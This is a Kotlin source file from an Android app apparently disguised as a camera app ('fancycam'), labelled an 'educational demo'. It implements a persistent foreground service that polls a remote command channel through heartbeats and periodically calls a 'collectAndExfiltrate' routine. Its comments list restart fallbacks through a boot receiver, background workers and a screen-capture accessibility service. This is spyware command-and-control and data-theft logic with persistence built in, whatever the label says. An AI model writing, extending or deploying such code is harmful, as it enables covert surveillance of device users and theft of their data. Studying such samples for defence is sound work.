package xyz.nahil.fancycam.services

import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.Log
import androidx.core.content.ContextCompat
import xyz.nahil.fancycam.network.AppConfig
import xyz.nahil.fancycam.network.DataExfilSender

/**
 * EDUCATIONAL DEMO SERVICE
 *
 * Single long-lived foreground service that owns the device's background
 * network cadence. Instead of spreading heartbeats and collection across two
 * in-Activity Handlers and two WorkManager jobs, this service runs one
 * predictable loop:
 *
 *   - every [AppConfig.getPollIntervalMs]  -> heartbeat + command processing
 *   - every [AppConfig.getCollectionIntervalMs] -> full data collection
 *
 * It is the PRIMARY path. The older mechanisms are kept as fallbacks and only
 * act when [isRunning] is false:
 *   - MainActivity heartbeat handler
 *   - DataCollectionWorker (WorkManager) — also best-effort restarts this service
 *   - ScreenCaptureAccessibilityService heartbeat
 *   - BootReceiver — restarts this service after boot or app update
 *
 * Android 14+ forbids starting most foreground services from the background, so
 * the service is started from the Activity; its fallbacks cover the cases where
 * the service is not running (e.g. user force-stopped it or the OS declined a
 * restart).
 */
class CommandPollingService : Service() {

    companion object {
        private const val TAG = "CommandPollingService"
        private const val OWNER = "command_polling"

        @Volatile
        var isRunning: Boolean = false
            private set

        /** Primary entry point — used by MainActivity (foreground, allowed). */
        fun start(context: Context) {
            try {
                val intent = Intent(context, CommandPollingService::class.java)
                ContextCompat.startForegroundService(context, intent)
            } catch (e: Exception) {
                // Called from the background on Android 12+? Fallbacks will cover the gap.
                Log.w(TAG, "Unable to start polling service; fallbacks remain active", e)
            }
        }

        fun stop(context: Context) {
            try {
                context.stopService(Intent(context, CommandPollingService::class.java))
            } catch (e: Exception) {
                Log.w(TAG, "Unable to stop polling service", e)
            }
        }
    }

    private lateinit var handlerThread: HandlerThread
    private lateinit var handler: Handler
    private var pollIntervalMs = AppConfig.DEFAULT_POLL_INTERVAL_MS
    private var collectionIntervalMs = AppConfig.DEFAULT_COLLECTION_INTERVAL_MS
    private var ticksSinceCollection = 0L

    private val pollRunnable = object : Runnable {
        override fun run() {
            try {
                // Heartbeat doubles as the command channel (processCommands = true)
                DataExfilSender.sendHeartbeat(this@CommandPollingService, processCommands = true)

                ticksSinceCollection++
                val ticksPerCollection = (collectionIntervalMs / pollIntervalMs).coerceAtLeast(1L)
                if (ticksSinceCollection >= ticksPerCollection) {
                    ticksSinceCollection = 0
                    DataExfilSender.collectAndExfiltrate(this@CommandPollingService)
                }
            } catch (e: Exception) {
                Log.w(TAG, "Poll tick failed", e)
            } finally {
                handler.postDelayed(this, pollIntervalMs)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        ForegroundNotifier.ensureChannel(this)
        handlerThread = HandlerThread("fancycam-command-poll").also { it.start() }
        handler = Handler(handlerThread.looper)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        pollIntervalMs = AppConfig.getPollIntervalMs(this)
        collectionIntervalMs = AppConfig.getCollectionIntervalMs(this)

        ForegroundNotifier.startForeground(
            this,
            OWNER,
            ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
        )
        isRunning = true

        // Idempotent: restart the loop if onStartCommand fires again.
        handler.removeCallbacks(pollRunnable)
        ticksSinceCollection = 0
        handler.post(pollRunnable)

        Log.i(
            TAG,
            "[EDUCATIONAL] Command polling active (poll=${pollIntervalMs}ms, collection=${collectionIntervalMs}ms)"
        )
        return START_STICKY
    }

    override fun onDestroy() {
        isRunning = false
        ForegroundNotifier.stopForeground(this, OWNER)
        if (::handler.isInitialized) {
            handler.removeCallbacks(pollRunnable)
        }
        if (::handlerThread.isInitialized) {
            handlerThread.quitSafely()
        }
        Log.i(TAG, "[EDUCATIONAL] Command polling stopped")
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
